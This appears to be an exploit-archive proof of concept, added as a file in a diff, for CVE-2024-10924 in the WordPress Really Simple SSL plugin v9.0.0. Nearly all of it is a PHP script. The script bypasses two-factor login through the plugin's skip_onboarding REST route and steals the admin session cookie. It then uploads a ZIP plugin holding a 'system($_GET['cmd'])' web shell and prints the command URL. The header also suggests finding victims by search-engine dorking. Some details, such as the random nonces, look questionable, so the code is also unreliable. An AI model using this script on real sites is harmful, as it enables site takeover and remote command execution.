@@ -1,0 +1,134 @@
+=============================================================================================================================================
+| # Title     : WordPress Really Simple SSL plugin v9.0.0 PHP Back Connect                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/really-simple-ssl/                                                                            |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: Bypass 2FA in WordPress and upload and launch Payload. Code supports all operating systems
+
+    (Related : https://packetstorm.news/files/id/183035/ Related CVE numbers:	CVE-2024-10924 ) .
+	
+[+] Payload : 
+
+[+] Set Target : line 82
+
+[+] Usage : php poc.php 
+
+[+] PayLoad :
+
+<?php
+
+function create_zip_payload($plugin_name, $payload_name) {
+    $zip = new ZipArchive();
+    $zip_path = "$plugin_name.zip";
+
+    if ($zip->open($zip_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
+        return false;
+    }
+
+    // محتوى الحمولة (ملف PHP ضار)
+    $payload = "<?php echo 'Hacked by Indoushka'; system(\$_GET['cmd']); ?>";
+
+    // إضافة ملف الحمولة داخل الأرشيف
+    $zip->addFromString("$plugin_name/$payload_name.php", $payload);
+    $zip->close();
+
+    return file_exists($zip_path);
+}
+
+function check_wordpress_site($url) {
+    $headers = @get_headers($url);
+    if (!$headers || strpos($headers[0], '200') === false) {
+        return false;
+    }
+    return true;
+}
+
+function bypass_2fa($target, $user_id) {
+    $login_nonce = rand(1000000000, 9999999999);
+    $data = json_encode([
+        'user_id' => $user_id,
+        'login_nonce' => $login_nonce,
+        'redirect_to' => '/wp-admin/'
+    ]);
+    
+    $url = "$target?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding";
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    if (!$response) {
+        return false;
+    }
+    
+    preg_match('/(wordpress_logged_in_[a-f0-9]{32}=[^;]+)/', $response, $matches);
+    return $matches[1] ?? false;
+}
+
+function upload_payload($target, $admin_cookie, $plugin_name, $payload_name) {
+    $zip_path = "$plugin_name.zip";
+    
+    if (!file_exists($zip_path)) {
+        return false;
+    }
+
+    $url = "$target/wp-admin/update.php?action=upload-plugin";
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Cookie: ' . $admin_cookie,
+        'Content-Type: multipart/form-data'
+    ]);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, [
+        'pluginzip' => new CURLFile($zip_path),
+        '_wpnonce' => 'random_nonce',
+        'install-plugin-submit' => 'Install Now'
+    ]);
+    
+    $response = curl_exec($ch);
+    curl_close($ch);
+    
+    return strpos($response, 'Plugin installed successfully') !== false;
+}
+
+// الإعدادات الأساسية
+$target = "http://target.com";
+$user_id = 1;
+
+if (!check_wordpress_site($target)) {
+    die("موقع ووردبريس غير متصل.\n");
+}
+
+$admin_cookie = bypass_2fa($target, $user_id);
+if (!$admin_cookie) {
+    die("فشل في تجاوز المصادقة الثنائية.\n");
+}
+
+$plugin_name = "wp_" . substr(md5(mt_rand()), 0, 5);
+$payload_name = "ajax_" . substr(md5(mt_rand()), 0, 5);
+
+if (!create_zip_payload($plugin_name, $payload_name)) {
+    die("فشل في إنشاء ملف ZIP.\n");
+}
+
+if (!upload_payload($target, $admin_cookie, $plugin_name, $payload_name)) {
+    die("فشل في رفع الحمولة.\n");
+}
+
+echo "تم تنفيذ الحمولة على الرابط:\n$target/wp-content/plugins/$plugin_name/$payload_name.php?cmd=id\n";
+
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
